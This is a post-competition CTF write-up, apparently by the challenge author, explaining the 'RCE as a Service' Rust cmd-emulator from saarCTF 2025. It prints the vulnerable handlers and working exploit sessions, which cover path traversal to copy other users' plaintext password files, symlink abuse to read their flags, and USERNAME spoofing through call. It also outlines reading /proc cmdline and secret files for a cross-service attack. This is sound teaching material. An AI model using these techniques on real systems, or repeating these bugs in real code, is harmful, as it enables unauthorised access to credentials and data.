+++
title = "Remote Code Execution as a Service - saarCTF 2025"
author = "sol"
date = 2025-10-28
description = "Remote Code Execution as a Service was my service for saarCTF 2025. It was a cmd-esque emulator written in Rust."

[taxonomies]
tags = ["writeup", "saarsec", "2025", "saarctf"]
+++

# cat rceaas.md

<center>
    <img src="../bluescreen.png" alt="Image of a old windows bluescreen">
</center>


`Remote Code Execution as a Service` (RCEaaS) was my service for saarCTF 2025.
It was acmd-esque emulator written in Rust. Let's first look at the service 
structure:

```txt,name=tree src
.
├── jail
│   ├── command.rs
│   └── mod.rs
└── main.rs
```

We basically can see three files that make up the service. I will provide some
pseudocode thats __less rusty__ and explains the inner workings of the service:

```python
def main():
    username, password = get_creds()
    if username.exists()
        try_login(username,password)
    else:
        register_user(username,password)
    start_jail(username)

def start_jail():
    while True:
        print_prompt()
        command = get_command()
        command,arguments = parse_command(command)
        commands = {'echo': handle_echo, 'type': handle_type, ...}
        commands[command](arguments)
```

This is the basic inner workings of the service. It takes a command parses it
and then runs the command. The commands are based on the Windows CMD commands

Lets connect to the service and see how we can interact with it:

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
Enter your username: saarsec
Enter your password: saarsec
saarCTF 2025 presents: RCE as a Service
C:/> help
call
copy
echo
exit
dir
set
cd
type
whoami
help
del
mklink
mkdir
C:/>
```

So this is exactly how I describe it. We see some cmd-esque prompt and when
we type `help` we get a list of all available commands. They mostly behave like
their real Windows counterpart. We can play with some of these commands:

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/>echo saarsec_rocks > testfile
```

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/>type testfile
saarsec_rocks
```

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/>whoami
saarsec
```

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/>set
USERNAME=saarsec
CWD=/
```

This looks already interesting. We see that we have some environment variables
that contain our username and our current working directory. Let's see how the
server saves our jails:

```bash,name=tree rceass
├── jails
│   ├── saarsec
│   │   └── testfile
├── passwords
│   ├── .saarsec
```

We see two directories the service manages. One is the `passwords` directory
and the other is the `jails` directory. The jails directory hosts all the user
jails and the passwords directory manages the logins. This gets us to our first
exploit:

## Exploit 1 - copy

When we check the code of how the CWD is used in mklink we see the following

```rust
fn handle_copy(&self, env: &mut Env) {
    match self.tokens.as_slice() {
        [_] => {
            println!("The syntax of the command is incorrect.");
        }
        [_, from, to, ..] => {
            let cwd = env
                .entry("CWD".to_string())
                .or_insert_with(|| "/".to_string());


            let cwd = add_slash_to_path(cwd);
            let dirname = &from.value;
            let base_dir = &self.base_dir;
            let cwd = normalize_path_string(&cwd.to_string());
            let from_path = format!("{base_dir}{cwd}/{dirname}");

            if !Path::new(&from_path).is_file() {
                println!("The system cannot find the file specified.");
                return;
            }

            let dirname = &to.value;
            let base_dir = &self.base_dir;
            let cwd = normalize_path_string(&cwd.to_string());
            let to_path = format!("{base_dir}{cwd}/{dirname}");

            let _ = fs::copy(from_path, to_path);
        }
        _ => process::exit(1),
    }
}
```

We see that it gets the `CWD` env variable and then **only** normalizes the
CWD but not the entered paths. This allows us to copy any file we can read from
the system to our jail. Even the passwords of other users. And luckily as we
are the passwords are stored in plaintext:

```rust
// ...
if !passwordfile_path.exists() {
    let mut passwordfile =
        File::create_new(passwordfile_path).expect("Could not create password file");
    let _ = passwordfile.write_all(password.as_bytes());
}
// ...
```

So let's try exploit the service with this knowledge:

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/> copy /../../passwords/.bob leaked_pass
C:/> type leaked_pass
0mG-u-l3ak3d-mY-p4SS
```

Awesome now let's use this passwords to login as this user:

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
Enter your username: bob
Enter your password: 0mG-u-l3ak3d-mY-p4SS
saarCTF 2025 presents: RCE as a Service
C:/> type flag
SAAR{...}
```

Awesome we have full control over that jail of that user now

## Exploit 2 - mklink and dir

Let's try to leak the flags of bob again but this time we want to leak it
without the password. First lets look at the code of the `dir` directory.

```rust
    fn handle_dir(&self, env: &mut Env) {
        let cwd = match env.get("CWD") {
            Some(p) => p,
            None => {
                env.insert("CWD".to_string(), "/".to_string());
                "/"
            }
        };
        if self.tokens.len() == 1 {
            let base_dir = &self.base_dir;
            let full_path = format!("{base_dir}{cwd}");
            let path = Path::new(&full_path);
            let entries = match path.read_dir() {
                Ok(entries) => entries,
                Err(_) => {
                    println!("The system cannot find the path specified.");
                    env.insert("CWD".to_string(), "/".to_string());
                    return;
                }
            }
            .flatten();
            for entry in entries {
                let node = entry
                    .file_name()
                    .into_string()
                    .expect("Could not convert node to string!");
                if node.starts_with('.') {
                    continue;
                }
                println!("{node}")
            }
        } else {
            todo!("Can't list specific path");
        }
    }
```

We see that the `dir` handler does something similar to the copy handler. It
takes the `CWD` env variable but does not sanitize this path. This means we
can use `set` to traverse up the directory tree. This allows us to leak any
directories content with dir. We now only need a way to actually read the files.
For this we can abuse `mklink`. This has the exact same vulnability as copy
we can use this to create arbitrary symlinks on the system. 

```rust
fn handle_mklink(&self, env: &mut Env) {
    match self.tokens.as_slice() {
        [_] => {
            println!("The syntax of the command is incorrect.");
        }
        [_, from, to, ..] => {
            let cwd = env
                .entry("CWD".to_string())
                .or_insert_with(|| "/".to_string());

            let cwd = add_slash_to_path(cwd);

            let dirname = &from.value;
            let base_dir = &self.base_dir;
            let cwd = normalize_path_string(&cwd.to_string());
            let from_path = format!("{base_dir}{cwd}/{dirname}");

            let dirname = &to.value;
            let base_dir = &self.base_dir;
            let cwd = normalize_path_string(&cwd.to_string());
            let to_path = format!("{base_dir}{cwd}/{dirname}");

            if Path::new(&from_path).is_dir() {
                println!("This system command cannot link to directories.");
                return;
            }

            let _ = symlink(from_path, to_path);
        }
        _ => process::exit(1),
    }
}
```

These two things together allow us to leak the flags again.

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/> set CWD=/../bob/
C:/../bob/> dir
flag
HDUQODW123
C:/../bob/> cd ..
C:/> mklink /../bob/flag ./flag1
C:/> mklink /../bob/HDUQODW123/flag ./flag2
C:/> type flag1
SAAR{...}
C:/> type flag2
SAAR{...}
```

With this we can get both flag stores without leaking the password of the user.


## Exploit 3 - call

The last intended exploit is in the `call` command. This one is the most
interesting one. Let's look at the code for it:


```rust
fn handle_call(&self, env: &mut Env) {
    match self.tokens.as_slice() {
        [_] => {
            println!("The syntax of the command is incorrect.");
        }
        [_, file, ..] => {
            let cwd = env
                .entry("CWD".to_string())
                .or_insert_with(|| "/".to_string());

            let cwd = add_slash_to_path(cwd);

            let filename = &file.value;
            let base_dir = &self.base_dir;
            let relative_path = normalize_path_string(&filename.to_string());
            let full_path = format!("{base_dir}{cwd}{relative_path}");


            if !Path::new(&full_path).is_file() {
                println!("The system cannot find the file specified.");
                return;
            }

            if Path::new(&full_path).is_dir() {
                println!("This system command cannot call directories.");
                return;
            }

            let content = match fs::read_to_string(full_path) {
                Ok(content) => content,
                Err(_) => {
                    println!("Could not retrieve content of file.");
                    return;
                }
            };
            let binding = current_dir().expect("Can not get current working directory!");
            let basedir = binding.to_string_lossy();
            let basedir = format!("{}/{}", basedir, "jails");
            let username = match env.get("USERNAME") {
                Some(username) => username,
                None => process::exit(0),
            }
            .clone();
            let userdir = format!("{basedir}/{username}");
            for line in content.lines() {
                if !Path::new(&userdir).exists() {
                    println!("Tampering detected. Quitting!");
                    process::exit(0);
                }
                let command = Command::try_from((line.into(), format!("{basedir}/{username}")));
                    match command {
                        Ok(command) => command.handle_command(env),
                        Err(s) => println!("{s}"),
                    }
            }
        }
        _ => process::exit(1),
    }
}
```

The code looks a bit difficult on the first look but it's quite simple when you
understand it. It just takes a file as an input, reads it, line by line and runs
these lines as commands in a 'new' jail. The important part is that it takes
your environment variables into the new jail without verifying them. More
importantly it takes any `USERNAME` variables you set and opens a jail for that
user. This means we can run commands in the context of any user. Let's just read
one of the two flag stores:

```cmd,name=socat -,raw,echo=0 tcp:127.0.0.1:1835
C:/> echo "type flag" > exploit.bat
C:/> set USERNAME=bob
C:/> call exploit.bat
SAAR{...}
```

## Bonus Exploit - No-Service

The people that played our CTF may have noticed that we had a rather 
'interesting' service this year. The service was called no-service
and was **not** vulnerable directly. If you opened the `server.py` file you
were greeted with the following message:


{% alert(type="info", icon="info", title="Message in server.py") %}
We were running out of time, so we didn't add vulns to this code. Sorry. <br>
So: be creative! <br>
Don't get stuck here, play another challenge and come back later. <br>
\- saarsec
{% end %}

This message hinted at the fact that the service was only exploitable by a
`cross service exploit` meaning you need to use another service to exploit it.
There were multiple ways to do this across a couple of services
but the astute of you may have noticed that my service could probably be used 
to archieve this. The approaches were the following:

### Flag Store 1 
1. Read /home/no-service/data1/secret.txt
2. Use the secret to access the first flag store via the no-service http API

### Flag Store 2

1. Brute force the PID of the no-service process via /proc/
2. Read the /proc/`<no-service-pid>`/cmdline
3. Get the second secret from that
4. Use that secret to access the second flag store via the no-service http API

--- 

This is it. This was my service for the 2025 edition of saarCTF. I hope
everyone had fun with it. To bo honest I haven't had much experience with
Rust and I still don'T have much but I really enjoyed creating the service
and would love to see some other writeups. Maybe with some unintended vulns?

Best

sol